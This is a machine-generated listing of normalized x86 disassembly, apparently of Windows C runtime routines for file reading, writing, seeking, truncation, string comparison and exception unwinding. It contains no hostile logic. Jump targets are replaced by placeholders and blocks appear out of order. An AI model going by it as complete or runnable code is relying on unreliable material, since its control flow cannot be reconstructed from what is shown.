jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_100141d7
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_1001416e
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10014507
mov eax [ ebp - 0x1c ]
call sub_1000b811
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_1001450f
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_10015336
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_1001455a
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10010d42
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_10010592
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_10011903
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_10011a20
pop ecx
test eax eax
jne r-xdata
call sub_10010592
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10011903
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_100119d7
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_1001111c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_100146ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1000b811
mov [ eax ] ebx
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1000b811
mov [ eax ] ebx
call sub_1000b7fe
mov [ eax ] 0x9
jmp r-xdata
call sub_1000b811
mov [ eax ] ebx
call sub_1000b7fe
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_1000b7ac
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_1000f158
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_10011097
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_1000b7fe
mov [ eax ] 0xc
call sub_1000b811
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_1000b824
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_10011097
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_10011097
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_10011097
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_10014c85
push 0x10
push r--data
call sub_1000f940
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_1000f985
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_100141d7
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x16
jmp r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_100146ce
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_1000b7ac
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10014d73
mov eax [ ebp - 0x1c ]
sub_10014d7b
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_10014db4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_10014d7b
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000a103
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000a103
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_10014e74
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10014db4
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_10014d7b
sub_10014ebb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_10015370
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000a103
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000a103
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_10014f9d
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10014ebb
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_10015370
sub_10014ff0
call sub_10012a9a
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_10012aa7
pop ecx
push 0x3
call sub_1000ee02
int3
push 0x1
push 0x40000015
push 0x3
call sub_1000b631
add esp 0xc
sub_10015023
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_10011097
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_1000b7fe
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_10011097
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_10011097
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10011097
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_1001524e
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_1000b7fe
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_1001416e
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_1000b7fe
mov [ eax ] 0xd
call sub_1000b811
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_1000b811
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_1000b7fe
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10011206
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_1001524e
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
jne r-xdata
sub_100151d9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_1001416e
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_1000b824
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_1001524e
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov ecx [ edx ]
and esi 0x1f
shl esi 0x6
add ecx esi
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_10015309
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
push 0x16
pop eax
pop ebp
retn
sub_10015370
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_100153d8
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_10015411
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10015465
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001643d
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_1001549b
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
